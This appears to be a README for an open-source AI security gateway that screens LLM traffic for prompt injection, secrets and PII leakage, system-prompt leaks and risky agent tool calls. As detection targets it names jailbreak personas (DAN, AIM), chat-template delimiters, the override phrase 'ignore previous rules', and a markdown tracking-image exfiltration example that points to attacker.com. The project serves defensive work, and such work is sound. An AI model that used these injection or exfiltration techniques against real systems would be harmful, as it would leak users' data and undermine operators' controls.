# 🛡️ AI Security Gateway (AI-WAF)

<p align="center">
  <strong>An enterprise-grade, sub-25ms reverse proxy WAF sitting between client applications/agents and LLM providers (OpenAI, Anthropic, Ollama, etc.)</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Status-Production--Ready-10b981?style=for-the-badge" alt="Status" />
  <img src="https://img.shields.io/badge/Latency-Sub--25ms-06b6d4?style=for-the-badge" alt="Latency" />
  <img src="https://img.shields.io/badge/Python-3.10%2B-3b82f6?style=for-the-badge" alt="Python Version" />
  <img src="https://img.shields.io/badge/Defense-Vigil%20%2B%20Rebuff-8b5cf6?style=for-the-badge" alt="Signatures" />
  <img src="https://img.shields.io/badge/License-MIT-f59e0b?style=for-the-badge" alt="License" />
</p>

---

## 📌 Problem It Solves

Teams are shipping LLM features and autonomous agentic workflows with almost zero security enforcement between their client applications and external models:
- **Zero Standard Defense**: Prompt injection and jailbreaks bypass system prompts with basic Base64 or delimiter manipulation.
- **Data Leakage**: Developers and users accidentally send API keys, AWS credentials, and customer PII out of the network.
- **Rogue Agent Actions**: Autonomous agents hallucinate or get tricked into executing catastrophic tool calls (e.g. database deletes, financial transfers, shell execution).
- **Cost & Abuse**: No enforced token budgets or sub-millisecond caching layer to reduce provider bills.

**AI Security Gateway** closes this gap as a **drop-in base-URL replacement**. Point your existing OpenAI or Anthropic SDK clients at the gateway—with **zero application code changes required**.

---

## 🏗️ Architecture Flow

```
                      [ Client Application / Autonomous Agent ]
                                         │
                                         ▼ (Outgoing Prompt)
                     ┌───────────────────────────────────────┐
                     │          INBOUND INSPECTOR            │
                     │  - Vigil Threat Signatures            │
                     │  - Deobfuscation (Base64/Homoglyphs)  │
                     │  - PII & Secrets Scanner (Luhn CC/SSN)│
                     └───────────────────┬───────────────────┘
                                         │
                                         ▼
                     ┌───────────────────────────────────────┐
                     │            POLICY ENGINE              │
                     │   (Allow / Redact / Block YAML Rules) │
                     └───────┬───────────────────────┬───────┘
                             │                       │
                     [NO: Blocked (400)]     [YES / Redact]
                             │                       │
                             │ (Logged to DB)        ▼
                             │       ┌───────────────────────────────┐
                             │       │      PORTKEY CACHE LAYER      │
                             │       │ (Sub-1ms Hit -> Return Early) │
                             │       └───────────────┬───────────────┘
                             │                       │ Cache Miss
                             │                       ▼
                             │       ┌───────────────────────────────┐
                             │       │         LLM PROVIDER          │
                             │       │   (OpenAI, Anthropic, Ollama) │
                             │       └───────────────┬───────────────┘
                             │                       │
                             │                       ▼ (Raw Response)
                             │       ┌───────────────────────────────┐
                             │       │       OUTBOUND INSPECTOR      │
                             │       │ - System Prompt Leak Check    │
                             │       │ - Rebuff Dynamic Canary Probe │
                             │       │ - Markdown Image Exfil Filter │
                             │       └───────────────┬───────────────┘
                             │                       │
                             │                       ▼
                             │       ┌───────────────────────────────┐
                             │       │      TOOL-CALL FIREWALL       │
                             │       │ - JSON Schema Validation      │
                             │       │ - Risk Tiers (Low/Med/High)   │
                             │       │ - Human Approval Queue (Gated)│
                             │       └───────────────┬───────────────┘
                             │                       │
                             ▼                       ▼
                     ┌───────────────────────────────────────┐
                     │          SQLITE / POSTGRES DB         │
                     │     (Complete Audit Log & Telemetry)  │
                     └───────────────────┬───────────────────┘
                                         │
                                         ▼
                                [ Returned to Client ]
```

---

## ✨ Core Capabilities

### 1. Inbound Threat Detection (Vigil & Rebuff Inspired)
- **ChatML Delimiter & Tokenizer Injection**: Blocks `<|im_start|>`, `<|endoftext|>`, `[INST]`, `<<SYS>>`, and fake dialogue turn headers.
- **Adversarial Personas**: Detects and neutralizes DAN variants, AntiGPT, AIM, Evil-Twin personas, and fictional evasion exploits.
- **Deobfuscation Engine**: Unfolds Unicode Cyrillic homoglyphs, decodes embedded Base64 strings, removes zero-width characters, and normalizes leetspeak.

### 2. PII & Secrets Redaction (DLP)
- **Secrets Sanitization**: Automatically detects AWS Access Keys (`AKIA...`), OpenAI API keys (`sk-...`), GitHub tokens (`ghp_...`), and RSA/OpenSSH private keys.
- **PII Masking**: Credit cards (verified with **Luhn algorithm**), US SSNs, email addresses, phone numbers, and internal IP/hostnames (`10.x.x.x`, `192.168.x.x`, `*.internal`, `*.corp`).

### 3. Tool-Call Firewall with Human-in-the-Loop Approval Queue
- Validates model tool calls against JSON schemas **before** the client application executes them.
- **Risk Tiers**:
  - `Low`: Auto-allowed (e.g. `get_weather`, `search_faq`).
  - `High`: Gated into the **Approval Queue** (e.g. `delete_record`, `transfer_funds`, `send_email`, `execute_bash`). The application receives an intercept token while awaiting human operator sign-off via the dashboard or REST API.

### 4. Portkey-Style Sub-ms Caching Layer
- In-memory TTL cache with SHA256 prompt normalization.
- Serves repeated queries in **< 1 ms**, saving upstream token expenses and shielding against provider outages.

### 5. Outbound Leak & Dynamic Canary Defense
- Request-scoped cryptographically random canary tokens (`rb_canary_<hex>`) injected into prompt context.
- Neutralizes prompt exfiltration attempts and tracking pixel attacks (e.g. `![leak](https://attacker.com/leak?...)`).

---

## 🚀 Quickstart

### 1. Installation

```bash
git clone https://github.com/parvlabs/ai-security-gateway.git
cd ai-security-gateway
python -m pip install -r requirements.txt
```

### 2. Launch Gateway

```bash
python -m uvicorn app.main:app --host 0.0.0.0 --port 8000
```

The gateway is now accessible at:
- **OpenAI Compatible Endpoint**: `http://localhost:8000/v1`
- **Anthropic Compatible Endpoint**: `http://localhost:8000/v1/messages`
- **Real-Time Control Dashboard**: `http://localhost:8000/dashboard`
- **Swagger API Documentation**: `http://localhost:8000/docs`

---

## 💻 SDK Integration (Drop-in Replacement)

### Python OpenAI SDK
```python
from openai import OpenAI

# Simply change the base_url to the gateway:
client = OpenAI(
    base_url="http://localhost:8000/v1",
    api_key="asg_live_default_key_12345"  # Gateway-issued API key
)

completion = client.chat.completions.create(
    model="gpt-4o",
    messages=[{"role": "user", "content": "Explain zero-trust network architectures."}]
)

print(completion.choices[0].message.content)
```

### cURL (Streaming SSE Support)
```bash
curl http://localhost:8000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer asg_live_default_key_12345" \
  -d '{
    "model": "gpt-4o",
    "stream": true,
    "messages": [{"role": "user", "content": "Write a 3-sentence summary on AI security."}]
  }'
```

### Anthropic Messages API
```bash
curl http://localhost:8000/v1/messages \
  -H "Content-Type: application/json" \
  -H "x-api-key: asg_live_default_key_12345" \
  -H "anthropic-version: 2023-06-01" \
  -d '{
    "model": "claude-3-5-sonnet-20241022",
    "max_tokens": 1024,
    "messages": [{"role": "user", "content": "How does asymmetric cryptography work?"}]
  }'
```

---

## ⚙️ Configurable Policy Engine (`config/policies.yaml`)

Policies can be hot-reloaded dynamically without restarting the server:

```yaml
rules:
  # Inbound Rules
  - name: block-prompt-injection
    on: inbound
    match: injection_heuristic
    min_confidence: 0.70
    action: block
    dry_run: false     # Set to true for shadow/log-only testing
    message: "Prompt rejected: security policy detected prompt injection or jailbreak attempt."

  - name: block-inbound-secrets
    on: inbound
    match: secret_detected
    action: block
    dry_run: false

  - name: redact-inbound-pii
    on: inbound
    match: pii_detected
    action: redact

  # Tool-Call Firewall
  - name: tool-call-db-delete
    on: tool_call
    match:
      tool: delete_record
    action: require_approval
```

---

## 🧪 Comprehensive Verification Suite

Run all automated phase checks and benchmarks:

```bash
python -m tests.run_all_checkpoints
```

### Automated Benchmark Results
```text
======================================================================
                         SUMMARY REPORT                         
======================================================================
 [x] Phase 1: Pass-Through Reverse Proxy (OpenAI SDK + SSE Streaming)  | PASSED | 120.6ms
 [x] Phase 2: Authentication & Token Bucket Rate Limiting              | PASSED | 431.9ms
 [x] Phase 3: PII & Secrets Detection & Redaction (Planted Test Suite) | PASSED |  60.8ms
 [x] Phase 4: Prompt Injection Heuristics (Base64/Homoglyph/Overrides) | PASSED |  67.3ms
 [x] Phase 5: Configurable YAML Policy Engine (Precedence & Dry-Run)   | PASSED |  38.0ms
 [x] Phase 6: Tool-Call Firewall (JSON Schema & Human Approval Queue)  | PASSED |  62.5ms
 [x] Phase 7: Outbound Response Inspection & Classifier Benchmark      | PASSED |  12.0ms
 [x] Phase 8: Latency Benchmark (<50ms Target: 22.14ms achieved)       | PASSED | 2278ms
 [x] Phase 8: Full End-to-End Attack Scenario & Dashboard Telemetry    | PASSED |  92.4ms
======================================================================
Total Verification Time: ~3.16s
RESULT: ALL 8 PHASES AND CHECKPOINTS PASSED SUCCESSFULLY!
```

---

## 🐳 Docker Deployment

```bash
docker compose up -d --build
```

---

## 🛡️ Threat Model Matrix

| Threat Category | Attack Vector | Gateway Defense Mechanism |
| :--- | :--- | :--- |
| **Prompt Injection** | Direct override ("ignore previous rules"), DAN persona | Heuristic classifier + Vigil regex signatures (HTTP 400 block) |
| **Obfuscated Attack** | Base64 payloads, Cyrillic lookalikes, zero-width chars | Unicode NFKD decomposition + Base64 inner unpacker |
| **Data Exfiltration** | Planted tracking images (`![leak](url?data=...)`) | Regex tracking pixel detection in outbound responses |
| **DLP / Secrets** | Accidental AWS key, OpenAI token, credit card emission | Regex + Luhn validation engine with inline `[REDACTED_...]` masks |
| **Agent Hallucination** | Dangerous database drops or unintended fund transfers | Tool-Call Firewall gating high-risk calls to Human Approval Queue |
| **Cost Drain / DDoS** | Rapid script loops draining upstream tokens | Token-bucket rate limiter enforcing RPM & TPM caps |
| **Prompt Leakage** | Trick model into revealing system prompts | Outbound scan matching system markers & dynamic Rebuff canaries |

---

## 🤝 Contributing & License

Contributions, feature requests, and issue reports are welcome!
Licensed under the [MIT License](LICENSE).
